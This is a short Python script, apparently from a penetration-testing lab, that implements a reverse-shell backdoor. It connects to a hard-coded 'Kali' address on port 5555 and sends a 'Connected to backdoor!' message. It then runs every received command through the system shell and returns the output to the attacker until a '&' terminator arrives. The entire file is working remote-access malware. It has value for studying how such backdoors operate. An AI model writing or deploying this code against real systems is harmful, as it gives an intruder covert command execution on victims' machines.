import socket
import subprocess

kali_ip = "10.0.2.6"

# Create an INET, STREAMing socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((kali_ip, 5555))

# Send a message to the attacker
s.send("Connected to backdoor!\n".encode())

while True:
    # Receive command from Kali machine
    received_data = s.recv(1024).decode().strip()

    # Terminate connection if command is '&'
    if received_data == '&':
        break

    # Execute command to get output on kali
    try:
        output = subprocess.check_output(received_data, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output

    # Send the output back to the attacker
    s.send(output + b"\n")

# Close the connection
#print(received_data)
s.close()

